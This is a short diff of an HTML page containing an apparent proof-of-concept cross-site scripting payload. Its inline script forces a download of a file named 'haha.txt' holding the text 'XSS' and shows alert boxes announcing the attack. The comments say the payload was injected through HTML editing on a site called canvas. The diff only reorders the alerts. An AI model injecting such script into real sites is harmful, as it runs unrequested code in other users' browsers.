@@ -7,8 +7,6 @@
   </head>
   <body>
     <script>
-      alert("Cross Site Scripting attack!");
-      alert("Because canvas allows html editing I added a small iframe!");
       var filename="haha.txt";
       var filedata="XSS";
       var blob = new Blob([filedata],{"type":"octet/stream"});
@@ -20,6 +18,9 @@
       a.download=filename;
       
       a.click();
+      alert("Cross Site Scripting attack!");
+      alert("Because canvas allows html editing I added a small iframe!");
+      
     </script>
   </body>
 </html>
